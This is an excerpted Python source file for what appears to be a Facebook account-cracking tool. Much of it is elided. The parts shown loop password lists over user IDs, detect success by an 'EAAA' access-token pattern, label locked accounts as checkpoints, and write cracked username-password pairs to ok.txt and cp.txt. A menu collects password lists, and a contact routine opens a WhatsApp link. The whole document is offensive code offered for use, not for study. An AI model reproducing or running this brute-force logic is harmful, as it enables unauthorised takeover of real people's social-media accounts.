  ...
  try:
    for pw in passs:
      ...
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m[\x1b[0;37mSUCCESSFUL❤️\x1b[0;32m] %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m[\x1b[0;37mCHECKPOINT💔\x1b[0;33m] %s • %s '%(str(user), str(pw)))
        break
  except: pass
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mSUCCESSFUL❤️\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					...
					print(("\r\x1b[0;33m[\x1b[0;37mCHECKPOINT💔\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : khankhan,firstlast,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="success":
					...
					print(("\r\x1b[0;33m[\x1b[0;37mCHECKPOINT💔\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
...
class bapi:
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      print(("\r\x1b[0;32m[\b[0;37mSUCCESSFUL❤️\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[0;33m[\b[0;37mCHECKPOINT💔\x1b[0;33m] %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
...
class bapittl:
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\x1b[0;37SUCCESSFUL❤️\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[0;33m[\x1b[0;37mCHECKPOINT💔\x1b[0;33m] %s • %s • %s\x1b[0m   "%(username,password,ttl)))
        save = open("cp.txt", "a+")
...
def wangsaff():
    ...
    os.system("xdg-open https://wa.me/+923165456679?text=Assalamualaikum%20Bang,%20Saya%20Pengguna%20SC%20SBF%20Vivek.%20Code:%20404")
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()
